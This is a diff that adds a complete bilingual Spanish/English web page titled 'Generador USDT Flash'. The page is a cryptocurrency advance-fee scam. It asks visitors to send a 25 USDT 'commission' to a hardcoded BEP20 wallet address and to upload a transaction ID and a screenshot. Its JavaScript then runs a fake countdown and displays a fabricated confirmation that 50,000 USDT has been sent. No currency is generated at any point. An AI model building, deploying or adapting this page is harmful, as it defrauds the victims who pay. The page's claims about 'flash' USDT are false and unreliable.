@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Generador USDT Flash</title>
+    <style>
+        :root {
+            --primary: #6e45e2;
+            --secondary: #88d3ce;
+            --dark: #2a2d3e;
+            --light: #f0f2f5;
+            --success: #28a745;
+            --warning: #ffc107;
+            --danger: #dc3545;
+            --info: #17a2b8;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, var(--light) 0%, #e0e5ec 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            color: var(--dark);
+        }
+        
+        .card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 480px;
+            overflow: hidden;
+        }
+        
+        .card-header {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: white;
+            padding: 24px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .language-switcher {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            display: flex;
+            gap: 8px;
+        }
+        
+        .lang-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: background 0.3s;
+        }
+        
+        .lang-btn:hover, .lang-btn.active {
+            background: rgba(255, 255, 255, 0.4);
+        }
+        
+        .card-body {
+            padding: 24px;
+        }
+        
+        .balance {
+            background: rgba(110, 69, 226, 0.1);
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .balance h2 {
+            margin: 0;
+            font-size: 1.5rem;
+            color: var(--primary);
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e0e3eb;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border 0.3s;
+            box-sizing: border-box;
+        }
+        
+        input:focus, select:focus {
+            border-color: var(--primary);
+            outline: none;
+        }
+        
+        .example {
+            font-size: 0.85rem;
+            color: #666;
+            margin-top: 4px;
+        }
+        
+        .commission {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 24px 0;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .commission.insufficient {
+            background: #fff3f3;
+            color: var(--danger);
+        }
+        
+        .commission.processing {
+            background: #e7f5ff;
+            color: var(--info);
+        }
+        
+        .wallet-address {
+            background: #f0f2f5;
+            border-radius: 8px;
+            padding: 12px;
+            font-family: monospace;
+            word-break: break-all;
+            margin: 16px 0;
+            position: relative;
+        }
+        
+        .btn {
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: block;
+            width: 100%;
+            transition: all 0.3s;
+            text-align: center;
+            font-size: 1rem;
+            margin-bottom: 16px;
+        }
+        
+        .copy-btn {
+            background: var(--primary);
+            margin-top: 8px;
+            padding: 12px;
+        }
+        
+        .copy-btn:hover {
+            background: #5a36c7;
+            transform: translateY(-2px);
+        }
+        
+        .generate-btn {
+            background: var(--success);
+            font-size: 1.2rem;
+            box-shadow: 0 6px 15px rgba(40, 167, 69, 0.4);
+            margin-top: 24px;
+            padding: 18px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .generate-btn:hover {
+            background: #218838;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(40, 167, 69, 0.5);
+        }
+        
+        .generate-btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+        
+        .generate-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0.3) 0%,
+                rgba(255, 255, 255, 0) 60%
+            );
+            transform: rotate(30deg);
+            transition: all 0.3s;
+        }
+        
+        .generate-btn:hover::after {
+            left: 100%;
+        }
+        
+        .payment-btn {
+            background: var(--warning);
+            color: var(--dark);
+            font-weight: 700;
+        }
+        
+        .payment-btn:hover {
+            background: #e0a800;
+            transform: translateY(-2px);
+        }
+        
+        .payment-form {
+            display: none;
+            background: #f9f9f9;
+            padding: 16px;
+            border-radius: 8px;
+            margin: 16px 0;
+        }
+        
+        .preview-image {
+            max-width: 100%;
+            margin-top: 12px;
+            border-radius: 8px;
+            display: none;
+        }
+        
+        .status-message {
+            padding: 12px;
+            border-radius: 8px;
+            margin: 16px 0;
+            text-align: center;
+            display: none;
+        }
+        
+        .success {
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        
+        .info {
+            background: #e7f5ff;
+            color: #0c5460;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .countdown {
+            font-weight: bold;
+            color: var(--primary);
+        }
+        
+        .network-warning {
+            font-size: 0.85rem;
+            color: var(--danger);
+            margin-top: 4px;
+            font-weight: 600;
+        }
+        
+        .payment-notice {
+            background: #fff8e6;
+            border-left: 4px solid var(--warning);
+            padding: 12px;
+            margin: 20px 0;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+        
+        .payment-notice strong {
+            color: var(--danger);
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="card-header">
+            <div class="language-switcher">
+                <button class="lang-btn active" id="langEs">ES</button>
+                <button class="lang-btn" id="langEn">EN</button>
+            </div>
+            <h1 data-i18n="title">Generador USDT Flash</h1>
+        </div>
+        
+        <div class="card-body">
+            <div class="balance">
+                <h2 data-i18n="balance">SALDO USDT DISPONIBLE: <span id="usdtBalance">0.00</span> USDT</h2>
+            </div>
+            
+            <h3 data-i18n="recharge_title">Recargar Saldo USDT</h3>
+            
+            <form id="mainForm">
+                <div class="form-group">
+                    <label for="address" data-i18n="address_label">1. Ingresa tu dirección TRC20/ERC20/BEP20:</label>
+                    <input type="text" id="address" data-i18n-placeholder="address_placeholder" placeholder="Ejemplo: 0x2da4F742E6EbB71D57afA25D913376E486A52c10" required>
+                    <div class="example" data-i18n="address_hint">Debe ser una dirección válida de la red TRON (TRC20), Ethereum (ERC20) o Binance Smart Chain (BEP20)</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="amount" data-i18n="amount_label">2. Cantidad de USDT a generar (Máximo 50,000):</label>
+                    <input type="number" id="amount" value="50000" max="50000" required>
+                </div>
+                
+                <div class="commission" id="commissionInfo">
+                    <strong data-i18n="commission_label">Comisión requerida:</strong> <span id="commissionAmount">25</span> USDT
+                    <div id="processingMessage" style="display: none; margin-top: 8px;">
+                        <span data-i18n="processing">Procesando...</span> 
+                        <span class="countdown" id="countdown">0:15</span>
+                    </div>
+                </div>
+                
+                <div>
+                    <strong data-i18n="deposit_label">Depositar a la siguiente dirección BEP20:</strong>
+                    <div class="wallet-address" id="wallet-address">
+                        0x2da4F742E6EbB71D57afA25D913376E486A52c10
+                    </div>
+                    <div class="network-warning">Asegúrese de enviar USDT en la red BEP20</div>
+                    <button type="button" class="btn copy-btn" onclick="copyToClipboard()" data-i18n="copy_btn">Copiar Dirección</button>
+                </div>
+                
+                <div class="payment-notice">
+                    <strong>IMPORTANTE:</strong> <span data-i18n="payment_warning">Si no realizas el pago, los USDT Flash NO llegarán a tu cuenta. Esta verificación evita pagos falsos.</span>
+                </div>
+                
+                <button type="button" class="btn payment-btn" id="paymentToggle" data-i18n="payment_btn">Ya hice el pago</button>
+                
+                <div class="payment-form" id="paymentForm">
+                    <div class="form-group">
+                        <label for="transaction" data-i18n="txid_label">Número de transacción (TXID):</label>
+                        <input type="text" id="transaction" data-i18n-placeholder="txid_placeholder" placeholder="Ingresa el hash de tu transacción">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="proof" data-i18n="proof_label">Comprobante de pago (captura):</label>
+                        <input type="file" id="proof" accept="image/*">
+                        <img id="preview" class="preview-image" alt="Vista previa de la imagen">
+                    </div>
+                    
+                    <button type="button" class="btn generate-btn" onclick="submitPayment()" data-i18n="submit_proof_btn">Enviar Comprobante</button>
+                </div>
+                
+                <div id="statusMessage" class="status-message"></div>
+                
+                <button type="button" id="generateBtn" class="generate-btn" onclick="generateUSDT()">
+                    <span id="btnText" data-i18n="generate_btn">GENERAR USDT FLASH</span>
+                    <span id="btnLoader" class="loading" style="display:none;"></span>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Variables de estado
+        let currentLanguage = 'es';
+        let usdtBalance = 0.00;
+        const requiredCommission = 25;
+        let paymentProcessing = false;
+        let countdownInterval;
+        let processingTime = 15; // 15 segundos
+
+        // Traducciones
+        const translations = {
+            'es': {
+                'title': 'Generador USDT Flash',
+                'balance': 'SALDO USDT DISPONIBLE: ',
+                'recharge_title': 'Recargar Saldo USDT',
+                'address_label': '1. Ingresa tu dirección TRC20/ERC20/BEP20:',
+                'address_placeholder': 'Ejemplo: 0x2da4F742E6EbB71D57afA25D913376E486A52c10',
+                'address_hint': 'Debe ser una dirección válida de la red TRON (TRC20), Ethereum (ERC20) o Binance Smart Chain (BEP20)',
+                'amount_label': '2. Cantidad de USDT a generar (Máximo 50,000):',
+                'commission_label': 'Comisión requerida:',
+                'deposit_label': 'Depositar a la siguiente dirección BEP20:',
+                'copy_btn': 'Copiar Dirección',
+                'payment_btn': 'Ya hice el pago',
+                'txid_label': 'Número de transacción (TXID):',
+                'txid_placeholder': 'Ingresa el hash de tu transacción',
+                'proof_label': 'Comprobante de pago (captura):',
+                'submit_proof_btn': 'Enviar Comprobante',
+                'generate_btn': 'GENERAR USDT FLASH',
+                'insufficient_balance': 'Saldo insuficiente. Necesitas al menos 25 USDT para la comisión.',
+                'success_payment': 'Comprobante recibido. Validando pago...',
+                'success_transaction': 'Se han enviado 50,000 USDT Flash a la dirección: ',
+                'error_address': 'Por favor ingresa una dirección válida',
+                'error_amount': 'El monto máximo es 50,000 USDT',
+                'error_fields': 'Por favor completa todos los campos',
+                'processing': 'Procesando...',
+                'payment_validating': 'Validando pago. Por favor espere...',
+                'payment_validated': 'Pago validado. Saldo actualizado.',
+                'commission_deducted': 'Comisión deducida. Transacción completada.',
+                'network_warning': 'Asegúrese de enviar USDT en la red BEP20',
+                'payment_warning': 'Si no realizas el pago, los USDT Flash NO llegarán a tu cuenta. Esta verificación evita pagos falsos.'
+            },
+            'en': {
+                'title': 'USDT Flash Generator',
+                'balance': 'AVAILABLE USDT BALANCE: ',
+                'recharge_title': 'Recharge USDT Balance',
+                'address_label': '1. Enter your TRC20/ERC20/BEP20 address:',
+                'address_placeholder': 'Example: 0x2da4F742E6EbB71D57afA25D913376E486A52c10',
+                'address_hint': 'Must be a valid TRON (TRC20), Ethereum (ERC20) or Binance Smart Chain (BEP20) address',
+                'amount_label': '2. Amount of USDT to generate (Maximum 50,000):',
+                'commission_label': 'Required commission:',
+                'deposit_label': 'Deposit to the following BEP20 address:',
+                'copy_btn': 'Copy Address',
+                'payment_btn': 'I already made the payment',
+                'txid_label': 'Transaction number (TXID):',
+                'txid_placeholder': 'Enter your transaction hash',
+                'proof_label': 'Payment proof (screenshot):',
+                'submit_proof_btn': 'Submit Proof',
+                'generate_btn': 'GENERATE USDT FLASH',
+                'insufficient_balance': 'Insufficient balance. You need at least 25 USDT for the commission.',
+                'success_payment': 'Proof received. Validating payment...',
+                'success_transaction': '50,000 USDT Flash sent to address: ',
+                'error_address': 'Please enter a valid address',
+                'error_amount': 'Maximum amount is 50,000 USDT',
+                'error_fields': 'Please complete all fields',
+                'processing': 'Processing...',
+                'payment_validating': 'Validating payment. Please wait...',
+                'payment_validated': 'Payment validated. Balance updated.',
+                'commission_deducted': 'Commission deducted. Transaction completed.',
+                'network_warning': 'Make sure to send USDT on BEP20 network',
+                'payment_warning': 'If you do not make the payment, the USDT Flash WILL NOT reach your account. This verification prevents fake payments.'
+            }
+        };
+
+        // Función para actualizar el countdown
+        function updateCountdown() {
+            const seconds = processingTime;
+            document.getElementById('countdown').textContent = `0:${seconds < 10 ? '0' : ''}${seconds}`;
+            
+            if (processingTime <= 0) {
+                clearInterval(countdownInterval);
+                if (paymentProcessing) {
+                    validatePayment();
+                } else {
+                    completeTransaction();
+                }
+            } else {
+                processingTime--;
+            }
+        }
+
+        // Función para cambiar idioma
+        function changeLanguage(lang) {
+            currentLanguage = lang;
+            
+            // Actualizar botones de idioma
+            document.getElementById('langEs').classList.toggle('active', lang === 'es');
+            document.getElementById('langEn').classList.toggle('active', lang === 'en');
+            
+            // Actualizar todos los textos traducibles
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (translations[lang][key]) {
+                    el.textContent = translations[lang][key];
+                }
+            });
+            
+            // Actualizar placeholders
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+                const key = el.getAttribute('data-i18n-placeholder');
+                if (translations[lang][key]) {
+                    el.setAttribute('placeholder', translations[lang][key]);
+                }
+            });
+            
+            // Actualizar mensajes de estado si están visibles
+            const status = document.getElementById('statusMessage');
+            if (status.style.display === 'block') {
+                const currentText = status.textContent;
+                for (const key in translations['es']) {
+                    if (translations['es'][key] === currentText && translations[lang][key]) {
+                        status.textContent = translations[lang][key];
+                        break;
+                    }
+                }
+            }
+            
+            // Actualizar advertencia de red
+            document.querySelector('.network-warning').textContent = translations[lang]['network_warning'];
+            
+            // Actualizar aviso de pago
+            document.querySelector('.payment-notice span').textContent = translations[lang]['payment_warning'];
+            
+            // Verificar saldo para actualizar mensaje de comisión
+            checkBalance();
+        }
+        
+        // Función para copiar dirección
+        function copyToClipboard() {
+            const address = document.getElementById('wallet-address').textContent;
+            navigator.clipboard.writeText(address.trim())
+                .then(() => {
+                    const btn = document.querySelector('.copy-btn');
+                    btn.textContent = currentLanguage === 'es' ? '¡Copiado!' : 'Copied!';
+                    setTimeout(() => {
+                        btn.textContent = translations[currentLanguage]['copy_btn'];
+                    }, 2000);
+                })
+                .catch(err => {
+                    showStatus('Error al copiar: ' + err, 'error');
+                });
+        }
+        
+        // Función para verificar saldo
+        function checkBalance() {
+            const commissionInfo = document.getElementById('commissionInfo');
+            const generateBtn = document.getElementById('generateBtn');
+            
+            if (usdtBalance >= requiredCommission) {
+                commissionInfo.classList.remove('insufficient');
+                generateBtn.disabled = false;
+            } else {
+                commissionInfo.classList.add('insufficient');
+                generateBtn.disabled = true;
+                showStatus(translations[currentLanguage]['insufficient_balance'], 'error');
+            }
+        }
+        
+        // Función para mostrar mensajes de estado
+        function showStatus(message, type) {
+            const status = document.getElementById('statusMessage');
+            status.textContent = message;
+            status.className = 'status-message ' + type;
+            status.style.display = 'block';
+            
+            setTimeout(() => {
+                status.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Toggle para mostrar formulario de pago
+        document.getElementById('paymentToggle').addEventListener('click', function() {
+            const form = document.getElementById('paymentForm');
+            form.style.display = form.style.display === 'block' ? 'none' : 'block';
+        });
+        
+        // Vista previa de imagen
+        document.getElementById('proof').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    const preview = document.getElementById('preview');
+                    preview.src = event.target.result;
+                    preview.style.display = 'block';
+                }
+                reader.readAsDataURL(file);
+            }
+        });
+        
+        // Validar pago después de 15 segundos
+        function validatePayment() {
+            const commissionInfo = document.getElementById('commissionInfo');
+            commissionInfo.classList.remove('processing');
+            document.getElementById('processingMessage').style.display = 'none';
+            
+            // Actualizar saldo
+            usdtBalance = requiredCommission;
+            document.getElementById('usdtBalance').textContent = usdtBalance.toFixed(2);
+            
+            showStatus(translations[currentLanguage]['payment_validated'], 'success');
+            checkBalance();
+            paymentProcessing = false;
+        }
+        
+        // Completar transacción después de 15 segundos
+        function completeTransaction() {
+            const commissionInfo = document.getElementById('commissionInfo');
+            commissionInfo.classList.remove('processing');
+            document.getElementById('processingMessage').style.display = 'none';
+            
+            // Deducir comisión
+            usdtBalance -= requiredCommission;
+            document.getElementById('usdtBalance').textContent = usdtBalance.toFixed(2);
+            
+            showStatus(translations[currentLanguage]['commission_deducted'], 'success');
+            checkBalance();
+            
+            // Mostrar mensaje de éxito
+            const address = document.getElementById('address').value;
+            showStatus(translations[currentLanguage]['success_transaction'] + address, 'success');
+            
+            // Resetear botón
+            const btn = document.getElementById('generateBtn');
+            const btnText = document.getElementById('btnText');
+            btnText.textContent = translations[currentLanguage]['generate_btn'];
+            btn.disabled = false;
+        }
+        
+        // Enviar comprobante (simulado)
+        function submitPayment() {
+            const txid = document.getElementById('transaction').value;
+            const file = document.getElementById('proof').files[0];
+            
+            if (!txid || !file) {
+                showStatus(translations[currentLanguage]['error_fields'], 'error');
+                return;
+            }
+            
+            // Mostrar estado de validación
+            showStatus(translations[currentLanguage]['payment_validating'], 'info');
+            document.getElementById('paymentForm').style.display = 'none';
+            document.getElementById('mainForm').reset();
+            document.getElementById('preview').style.display = 'none';
+            
+            // Iniciar countdown de 15 segundos
+            paymentProcessing = true;
+            processingTime = 15;
+            const commissionInfo = document.getElementById('commissionInfo');
+            commissionInfo.classList.add('processing');
+            document.getElementById('processingMessage').style.display = 'block';
+            
+            clearInterval(countdownInterval);
+            countdownInterval = setInterval(updateCountdown, 1000);
+        }
+        
+        // Función para generar USDT Flash
+        function generateUSDT() {
+            const address = document.getElementById('address').value;
+            const amount = document.getElementById('amount').value;
+            
+            if (!address) {
+                showStatus(translations[currentLanguage]['error_address'], 'error');
+                return;
+            }
+            
+            if (amount > 50000) {
+                showStatus(translations[currentLanguage]['error_amount'], 'error');
+                return;
+            }
+            
+            if (usdtBalance < requiredCommission) {
+                showStatus(translations[currentLanguage]['insufficient_balance'], 'error');
+                return;
+            }
+            
+            // Mostrar estado de carga
+            const btn = document.getElementById('generateBtn');
+            const btnText = document.getElementById('btnText');
+            const btnLoader = document.getElementById('btnLoader');
+            
+            btn.disabled = true;
+            btnText.textContent = translations[currentLanguage]['processing'];
+            btnLoader.style.display = 'inline-block';
+            
+            // Mostrar que se está procesando la comisión
+            const commissionInfo = document.getElementById('commissionInfo');
+            commissionInfo.classList.add('processing');
+            document.getElementById('processingMessage').style.display = 'block';
+            
+            // Iniciar countdown de 15 segundos
+            processingTime = 15;
+            clearInterval(countdownInterval);
+            countdownInterval = setInterval(updateCountdown, 1000);
+        }
+        
+        // Event listeners para cambio de idioma
+        document.getElementById('langEs').addEventListener('click', () => changeLanguage('es'));
+        document.getElementById('langEn').addEventListener('click', () => changeLanguage('en'));
+        
+        // Inicializar
+        checkBalance();
+    </script>
+</body>
+</html>
